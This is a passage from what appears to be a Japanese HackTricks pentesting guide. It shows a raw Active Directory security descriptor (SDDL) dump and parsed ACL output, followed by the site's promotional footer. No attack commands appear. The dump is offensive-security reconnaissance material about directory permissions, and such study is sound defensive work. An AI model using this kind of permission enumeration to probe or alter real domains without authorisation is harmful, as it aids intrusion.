2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
